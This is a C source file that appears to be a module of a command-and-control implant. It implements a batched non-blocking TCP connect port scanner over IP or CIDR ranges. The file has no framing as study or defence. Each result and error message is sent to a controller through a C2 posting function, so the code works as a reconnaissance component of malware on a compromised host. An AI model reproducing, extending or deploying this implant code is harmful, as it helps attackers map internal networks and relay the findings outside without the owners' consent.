#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <poll.h>

#include "tengu.h"

#define SCAN_BATCH   64
#define OUT_MAX      131072   // 128 KB

// Parse "22,80,100-200,443" into a port array. Returns count.
static int parse_ports(const char* s, uint16_t* ports, int max) {
    int n = 0;
    char buf[4096];
    strncpy(buf, s, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* tok = strtok(buf, ",");
    while (tok && n < max) {
        char* dash = strchr(tok, '-');
        if (dash) {
            int lo = atoi(tok);
            int hi = atoi(dash + 1);
            if (lo < 1) lo = 1;
            if (hi > 65535) hi = 65535;
            for (int p = lo; p <= hi && n < max; p++)
                ports[n++] = (uint16_t)p;
        } else {
            int p = atoi(tok);
            if (p >= 1 && p <= 65535)
                ports[n++] = (uint16_t)p;
        }
        tok = strtok(NULL, ",");
    }
    return n;
}

// Parse "192.168.1.0/24" or "10.0.0.5" into a list of IPs (network byte order).
// Returns count.
static int parse_targets(const char* target, uint32_t* ips, int max) {
    char buf[64];
    strncpy(buf, target, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* slash = strchr(buf, '/');
    int prefix = 32;
    if (slash) {
        *slash = '\0';
        prefix = atoi(slash + 1);
        if (prefix < 0)  prefix = 0;
        if (prefix > 32) prefix = 32;
    }

    struct in_addr addr;
    if (inet_pton(AF_INET, buf, &addr) != 1) return 0;

    if (prefix == 32) {
        ips[0] = addr.s_addr;
        return 1;
    }

    uint32_t base  = ntohl(addr.s_addr);
    uint32_t mask  = ~0u << (32 - prefix);
    uint32_t net   = base & mask;
    uint32_t bcast = net | ~mask;

    int n = 0;
    for (uint32_t ip = net + 1; ip < bcast && n < max; ip++)
        ips[n++] = htonl(ip);
    return n;
}

// Scan one IP against all ports. Appends results to out buffer.
// Returns bytes appended.
static size_t scan_host(uint32_t ip_net, const uint16_t* ports, int nports,
                         int timeout_ms, char* out, size_t out_pos, size_t out_max) {
    char ipstr[INET_ADDRSTRLEN];
    struct in_addr ia; ia.s_addr = ip_net;
    inet_ntop(AF_INET, &ia, ipstr, sizeof(ipstr));

    uint16_t open_ports[65535];
    int n_open = 0;

    int fds[SCAN_BATCH];
    struct pollfd pfds[SCAN_BATCH];

    int pi = 0;
    while (pi < nports) {
        int batch = nports - pi;
        if (batch > SCAN_BATCH) batch = SCAN_BATCH;

        // Open non-blocking sockets and connect.
        for (int b = 0; b < batch; b++) {
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) { fds[b] = -1; pfds[b].fd = -1; continue; }

            int fl = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, fl | O_NONBLOCK);

            struct sockaddr_in sa = {
                .sin_family      = AF_INET,
                .sin_addr.s_addr = ip_net,
                .sin_port        = htons(ports[pi + b]),
            };
            connect(fd, (struct sockaddr*)&sa, sizeof(sa));

            fds[b]         = fd;
            pfds[b].fd     = fd;
            pfds[b].events = POLLOUT;
        }

        poll(pfds, batch, timeout_ms);

        for (int b = 0; b < batch; b++) {
            if (fds[b] < 0) continue;
            if (pfds[b].revents & POLLOUT) {
                int err = 0;
                socklen_t len = sizeof(err);
                getsockopt(fds[b], SOL_SOCKET, SO_ERROR, &err, &len);
                if (err == 0)
                    open_ports[n_open++] = ports[pi + b];
            }
            close(fds[b]);
        }
        pi += batch;
    }

    if (n_open == 0) return out_pos;

    // Append host header + open ports.
    out_pos += snprintf(out + out_pos, out_max - out_pos, "%s\n", ipstr);
    for (int o = 0; o < n_open && out_pos < out_max - 32; o++)
        out_pos += snprintf(out + out_pos, out_max - out_pos,
                            "  %-6u  open\n", open_ports[o]);
    if (out_pos < out_max - 1)
        out[out_pos++] = '\n';

    return out_pos;
}

void cmd_portscan(uint32_t req_id, const char* target, const char* ports_str, int timeout_ms) {
    if (!target || !ports_str) return;
    if (timeout_ms <= 0 || timeout_ms > 10000) timeout_ms = 800;

    uint16_t* ports = malloc(65535 * sizeof(uint16_t));
    uint32_t* ips   = malloc(65536 * sizeof(uint32_t));
    char*     out   = calloc(1, OUT_MAX);
    if (!ports || !ips || !out) {
        free(ports); free(ips); free(out);
        return;
    }

    int nports = parse_ports(ports_str, ports, 65535);
    if (nports == 0) {
        const char* err = "portscan: no valid ports (use: 22,80 or 1-1024)";
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        free(ports); free(ips); free(out);
        return;
    }

    int nips = parse_targets(target, ips, 65536);
    if (nips == 0) {
        const char* err = "portscan: invalid target (use IP or CIDR: 10.0.0.0/24)";
        Buf* p = build_output_packet(req_id, COMMAND_ERROR, err);
        g_c2_post(p->data, p->size, NULL, NULL);
        buf_free(p);
        free(ports); free(ips); free(out);
        return;
    }

    size_t pos = 0;
    pos += snprintf(out, OUT_MAX, "Scanning %d host(s) x %d port(s) | timeout %dms\n\n",
                    nips, nports, timeout_ms);

    for (int i = 0; i < nips && pos < OUT_MAX - 512; i++)
        pos = scan_host(ips[i], ports, nports, timeout_ms, out, pos, OUT_MAX - 1);

    if (pos == (size_t)snprintf(NULL, 0, "Scanning %d host(s) x %d port(s) | timeout %dms\n\n",
                                nips, nports, timeout_ms))
        snprintf(out + pos, OUT_MAX - pos, "(no open ports found)\n");

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    free(ports); free(ips); free(out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
